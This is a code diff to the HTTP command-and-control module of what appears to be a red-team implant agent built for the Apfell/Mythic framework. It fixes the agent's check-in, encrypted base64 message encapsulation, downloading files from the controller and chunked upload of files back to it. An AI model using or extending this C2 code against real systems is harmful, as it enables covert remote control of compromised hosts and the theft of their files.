@@ -132,7 +132,7 @@ func (c *C2Default) SetRsaKey(newKey *rsa.PrivateKey) {
 }
 
 // CheckIn - check in a new agent
-func (c *C2Default) CheckIn(ip string, pid int, user string, host string) map[string]interface{} {
+func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interface{} {
 	var resp []byte
 
 	checkin := structs.CheckInMessage{}
@@ -152,7 +152,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) map[st
 	//log.Printf("Sending checkin msg: %+v\n", checkin)
 
 	if c.ExchangingKeys { // If exchangingKeys == true, then start EKE
-		sID := c.NegotiateKey()
+		_ = c.NegotiateKey()
 
 		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 		resp = c.htmlPostData(endpoint, raw)
@@ -239,7 +239,8 @@ func (c *C2Default) postRESTResponse(urlEnding string, task structs.Task, data [
 		resp := structs.Response{}
 		resp.Response = dataBuffer
 		resp.TaskID = task.TaskID
-		responseMsg.Responses = append(responseMsg.Responses, resp...)
+		responseMsg.Responses = make([]structs.Response, 1)
+		responseMsg.Responses[0] = resp
 
 		dataToSend, _ := json.Marshal(responseMsg)
 		ret := c.htmlPostData(urlEnding, dataToSend)
@@ -313,16 +314,15 @@ func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
 func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 	//log.Println("Sending HTML GET request to url: ", url)
 	client := &http.Client{}
-	var respBody []byte
 
 	if len(c.AesPSK) > 0 && len(body) > 0 {
 
 		body = EncryptMessage(body, c.AesPSK) // Encrypt and then encapsulate the task request
 	}
 
-	body = append([]byte(c.UUID), body...)                         // Prepend the UUID to the body of the request
-	body = base64.StdEncoding.EncodeToString(body)                 // Base64 the body
-	req, err := http.NewRequest("GET", url, bytes.NewBuffer(body)) // Make the new request
+	encapbody := append([]byte(c.UUID), body...)                              // Prepend the UUID to the body of the request
+	encbody := base64.StdEncoding.EncodeToString(encapbody)                   // Base64 the body
+	req, err := http.NewRequest("GET", url, bytes.NewBuffer([]byte(encbody))) // Make the new request
 	if err != nil {
 		//fmt.Sprintf("Error completing GET request: %s", err)
 		//log.Println("Error completing GET request: ", err.Error())
@@ -453,7 +453,7 @@ func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
 	}
 	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
 
-	num, err = f.Write(decoded)
+	_, err = f.Write(decoded)
 
 	if err != nil {
 		return success
@@ -470,13 +470,13 @@ func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
 			fileUploadMsg.FullPath = fileDetails.RemotePath
 
 			msg, _ := json.Marshal(fileUploadMsg)
-			rawData = c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url), msg)
+			rawData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url), msg)
 			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
 			_ = json.Unmarshal(rawData, &fileUploadMsgResponse)
 
 			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
 
-			num, err = f.Write(decoded)
+			_, err := f.Write(decoded)
 
 			if err != nil {
 				success = false
@@ -499,7 +499,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 
 	chunkResponse := structs.FileDownloadInitialMessage{}
 	chunkResponse.NumChunks = int(chunks)
-	chunkResponse.TaskID = task.ID
+	chunkResponse.TaskID = task.TaskID
 
 	msg, _ := json.Marshal(chunkResponse)
 	resp := c.PostResponse(task, string(msg))
@@ -511,9 +511,8 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 		return
 	}
 
-	raw, _ := base64.StdEncoding.DecodeString(fileResp.Responses[1])
 	fileDetails := structs.FileDownloadInitialMessageResponse{}
-	_ = json.Unmarshal(raw, &fileDetails)
+	_ = json.Unmarshal(resp, &fileDetails)
 
 	r := bytes.NewBuffer(fileData)
 	// Sleep here so we don't spam apfell
@@ -533,12 +532,13 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 		msg.FileID = fileDetails.FileID
 		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
 
-		msg, _ = json.Marshal(msg)
+		encmsg, _ := json.Marshal(msg)
 		subResp := structs.Response{}
-		subResp.Response = base64.StdEncoding.EncodeToString(msg)
+		subResp.Response = encmsg
 		subResp.TaskID = task.TaskID
 		taskResp := structs.TaskResponseMessage{}
-		taskResp.Responses = append(taskResp.Responses, subResp...)
+		taskResp.Responses = make([]structs.Response, 1)
+		taskResp.Responses[0] = subResp
 		dataToSend, _ := json.Marshal(taskResp)
 
 		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // TODO: update this for 1.4
